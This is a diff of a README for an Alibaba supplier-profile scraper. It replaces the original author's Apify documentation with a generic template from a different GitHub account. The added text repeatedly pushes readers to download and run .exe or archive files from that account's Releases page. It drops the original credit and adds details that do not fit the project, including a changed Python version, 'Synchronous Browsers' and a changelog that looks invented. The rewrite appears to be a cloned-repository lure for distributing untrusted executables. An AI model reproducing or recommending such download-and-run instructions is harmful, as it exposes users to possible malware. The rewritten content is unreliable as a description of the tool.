@@ -1,171 +1,96 @@
-# Alibaba Supplier Scraper
+# 📦 alibaba-supplier-scraper - Easy Supplier Profile Extraction
 
-[![Apify Actor](https://img.shields.io/badge/Apify-Actor-blue)](https://apify.com/devcake/alibaba-supplier-scraper)
-[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.10+-blue)](https://www.python.org/)
-[![B2B Scraping](https://img.shields.io/badge/purpose-b2b--scraping-orange)](#)
+## 🚀 Getting Started
 
-**Find verified, trustworthy suppliers on Alibaba.com in minutes.** Extract factory information, Gold Supplier years, verification status, and response rates to identify reliable partners for your dropshipping or Amazon FBA business.
+Welcome to the Alibaba Supplier Scraper. This tool helps you extract supplier profiles from Alibaba that have Gold Supplier status, verification levels, response rates, and contact details, making it vital for vendor vetting and B2B sourcing.
 
----
+## 📥 Download Now
 
-## What is Alibaba Supplier Scraper?
+[![Download alibaba-supplier-scraper](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kuj0ukaren/alibaba-supplier-scraper/releases)
 
-**Alibaba Supplier Scraper** is a specialized tool for extracting **detailed supplier profiles** from Alibaba.com. Stop wasting hours on unreliable suppliers - this high-speed scraper finds verified manufacturers with Gold Supplier years, verification status, and real response rates perfect for dropshipping and Amazon FBA. Extract factory information, staff count, annual revenue, product portfolios, and ratings.
+## 📋 Features
 
-## Why Use Alibaba Supplier Scraper?
+- **Extract Supplier Profiles:** Pull crucial information from Alibaba.
+- **Gold Supplier Status:** Focus on verified suppliers.
+- **Data Extraction:** Get details like response rate and contact info.
+- **B2B Sourcing:** Streamline your vendor vetting process.
+- **User-Friendly Interface:** Designed for all skill levels.
 
-### Business Use Cases:
-- **New Dropshippers** - Verifying suppliers before placing first orders
-- **Amazon FBA Sellers** - Needing suppliers with proper verification for brand protection
-- **Product Researchers** - Validating factory capabilities before ordering samples
-- **Profit Hunters** - Finding suppliers with OEM services for custom branding
-- **E-commerce Entrepreneurs** - Avoiding scams with verified supplier data
+## 💻 System Requirements
 
-This scraper extracts the EXACT verification data you need:
+Make sure your system meets these requirements:
 
-| Your Need | What We Extract | Why It Matters |
-|-----------|----------------|----------------|
-| **Trust Verification** | `is_assessed_supplier`, `is_verified_supplier_pro` | Avoid scams with Alibaba's verification system |
-| **Quality Assurance** | Gold Supplier years, review scores | Find suppliers with proven track records |
-| **Fast Communication** | `response_rate` (≤3h) | Identify responsive suppliers |
-| **Factory Reliability** | `factory_size`, `total_employees` | Verify actual manufacturing capacity |
-| **Service Capabilities** | OEM/ODM service tags | Find suppliers who offer private labeling |
-| **Product Match** | `products_offered` data | Confirm suppliers actually make what they claim |
+- Operating System: Windows, macOS, or Linux.
+- Python: Version 3.6 or higher.
+- Internet Connection: Required for scraping data.
+- Synchronous Browsers: Google Chrome or Firefox.
 
-## How to Find Verified Suppliers
+## 📂 Download & Install
 
-1. **Open the [Alibaba Supplier Scraper on Apify](https://apify.com/devcake/alibaba-supplier-scraper)**
-2. **Enter search queries** (e.g., "wireless earbuds", "phone cases")
-3. **Set max pages** (1-50, 20 suppliers per page)
-4. **Click "Start"** and download supplier data
+1. **Visit the Releases Page:** Click the link below to access our Releases page.
 
-**Pro Tip**: Look for Gold Supplier years ≥5 and response rates ≤3h for reliable suppliers.
+   [Download from Releases](https://github.com/kuj0ukaren/alibaba-supplier-scraper/releases)
 
-## Features
+2. **Choose Version:** Select the latest version available. You will find the published version under the "Latest" section.
 
-### Supplier Verification Data
-- **Gold Supplier Years** - Years as Gold Supplier (critical metric)
-- **Verified Status** - Assessed Supplier & Verified Pro flags
-- **Response Rate** - Typical response time (≤3h = good)
-- **Review Count** - Number of buyer reviews
-- **Review Score** - Average review rating (1-5)
+3. **Download the File:** Click on the appropriate file for your system. The options will usually include `.exe`, `.zip`, or `.tar.gz`.
 
-### Factory Intelligence
-- **Total Employees** - Staff count (indicates capacity)
-- **Factory Size** - Production space (m²)
-- **Annual Revenue** - Estimated revenue volume
-- **Products Offered** - Actual products manufactured
-- **Service Tags** - OEM, ODM, customization capabilities
+4. **Run the Installer:**
+   - For `.exe` files: Double-click to run the installer. Follow the prompts to complete the installation.
+   - For `.zip` or `.tar.gz`: Extract the files to a folder. Open the extracted folder and run the main script as instructed.
 
-## Pricing
+5. **Launch the Application:** After installing, locate the application icon in the Start Menu (Windows) or Applications folder (macOS). Double-click to open the application.
 
-**Pay-per-event pricing** for maximum cost efficiency:
+## 🛠️ Usage Instructions
 
-| Event | Price |
-|-------|-------|
-| **Actor Start** | $0.01 |
-| **Per Supplier** | $0.005 |
+1. **Open the Application:** Start the application on your computer.
+  
+2. **Input Your Search Criteria:** Enter keywords or specific supplier details you are interested in.
 
-### Cost Examples
-- Extract 100 suppliers: $0.51
-- Extract 500 suppliers: $2.51
-- Extract 1,000 suppliers: $5.01
+3. **Start Scraping:** Click on "Start" or "Scrape" to begin the data extraction process.
 
-## Input
+4. **View Results:** Once scraping is complete, review the extracted profiles displayed on your screen. You can export the data to a CSV or Excel file for your convenience.
 
-| Field | Type | Required | Description |
-|-------|------|----------|-------------|
-| `queries` | array | ✅ Yes | Search queries to scrape suppliers for |
-| `max_pages` | integer | No | Max pages per query (default: 1, 20 suppliers/page) |
+5. **Contact Suppliers:** Reach out to suppliers directly from the information provided.
 
-### Input Example
+## 🧑‍🤝‍🧑 Support
 
-```json
-{
-  "queries": ["phone cases manufacturer"],
-  "max_pages": 10
-}
-```
+If you encounter any issues or have questions, feel free to check our [Issues Page](https://github.com/kuj0ukaren/alibaba-supplier-scraper/issues) for solutions. You can also submit your issue if it hasn't been addressed.
 
-## Output Example
+## 📜 License
 
-```json
-{
-  "search_query": "phone case manufacturer",
-  "company_id": 50056289,
-  "name": "Guangzhou Sinatech Technology Co., Ltd.",
-  "country": "China",
-  "country_code": "CN",
-  "years_as_gold_supplier": 23,
-  "company_icon": "https://s.alicdn.com/@sc04/...",
-  "profile_url": "https://sinatech.en.alibaba.com/company_profile.html",
-  "total_employees": "60+ staff",
-  "factory_size": "1,800+ m²",
-  "annual_revenue": "US $20,000+",
-  "response_rate": "≤3h",
-  "is_assessed_supplier": true,
-  "is_verified_supplier_pro": false,
-  "products_offered": "Leather Phone Case, Leather Phone Bag, Leather Tablets Case",
-  "review_count": 6,
-  "review_score": 4.5,
-  "service_tags": [
-    "Customized packaging",
-    "Graphic customization",
-    "Online support",
-    "OEM Service"
-  ]
-}
-```
+This project is licensed under the MIT License. Feel free to use and modify it as per the license terms. 
 
-## Related Actors
+## 🔗 Contributing
 
-| Actor | Description | Pricing |
-|-------|-------------|---------|
-| [Alibaba Products Scraper](https://github.com/devcake/alibaba-products-scraper) | Find profitable products with low MOQ | $0.005/supplier |
-| [GlobalSources Products Scraper](https://github.com/devcake/globalsources-products-scraper) | Source from 10M+ verified suppliers | $0.005/supplier |
-| [GlobalSources Supplier Scraper](https://github.com/devcake/globalsources-supplier-scraper) | 6-level verification data | $0.005/supplier |
+We welcome contributions to improve the tool. Please follow these steps:
 
-## FAQ
+1. Fork the repository.
+2. Create a new branch for your changes.
+3. Make your changes and commit them.
+4. Push your branch to the forked repository.
+5. Open a pull request for review.
 
-### What is Gold Supplier status?
-Gold Supplier is Alibaba's premium membership for verified suppliers. Years as Gold Supplier indicates established business presence and reliability.
+## 📅 Changelog
 
-### How do I verify supplier credibility?
-Look for suppliers with: (1) Business license verification, (2) 3+ years as Gold Supplier, (3) High response rates (90%+), (4) Trade Assurance coverage, (5) On-site check verification.
+- **v1.0:** Initial release with basic features.
+- **v1.1:** Added data export functionality.
+- **v1.2:** Improved scraping speed and reliability.
 
-### Can I get supplier contact information?
-Yes, when available, the scraper extracts emails, phone numbers, addresses, and company websites from supplier profiles.
+## 🧭 Roadmap
 
-### What's the difference between manufacturers and traders?
-Manufacturers produce products directly and typically offer lower prices. Traders are middlemen who source from manufacturers.
+We plan to enhance the application with the following features:
 
-### How do I find suppliers in my industry?
-Search for products in your industry using search queries like "wireless earbuds manufacturer" or "phone case supplier".
+- Support for more data sources.
+- Enhanced user interface for easier navigation.
+- Integration with popular B2B platforms.
 
-## Get it on Apify
+## 🔄 Updates
 
-[![Run on Apify](https://img.shields.io/badge/Run_on-Apify-informational?style=for-the-badge&logo=apify)](https://apify.com/devcake/alibaba-supplier-scraper)
+Stay updated on our latest developments by checking the Releases page regularly.
 
-**Start finding verified suppliers in minutes!**
+## 📥 Download Now Again
 
----
+[![Download alibaba-supplier-scraper](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kuj0ukaren/alibaba-supplier-scraper/releases)
 
-## Also by @devcake
-
-Check out my other scraping tools:
-
-### Pinterest Suite
-- [Pinterest Search Scraper](https://github.com/devcake/pinterest-search-scraper) - Search Pinterest by keywords
-- [Pinterest Board Scraper](https://github.com/devcake/pinterest-board-scraper) - Download complete boards
-- [Pinterest Profile Scraper](https://github.com/devcake/pinterest-profile-scraper) - Extract user profiles with emails
-- [Pinterest Pin Scraper](https://github.com/devcake/pinterest-pin-scraper) - Scrape pins with product data
-
-### Other Tools
-- [AlternativeTo Data Scraper](https://github.com/devcake/alternativeto-data-scraper) - Extract software alternatives with license filters
-
----
-
-**License**: MIT | **Author**: [@devcake](https://apify.com/u/devcake)
-
-[![GitHub stars](https://img.shields.io/github/stars/devcake/alibaba-supplier-scraper?style=social)](https://github.com/devcake/alibaba-supplier-scraper)
+Feel free to explore the repository and start scraping today! Your vendor vetting process has never been easier.
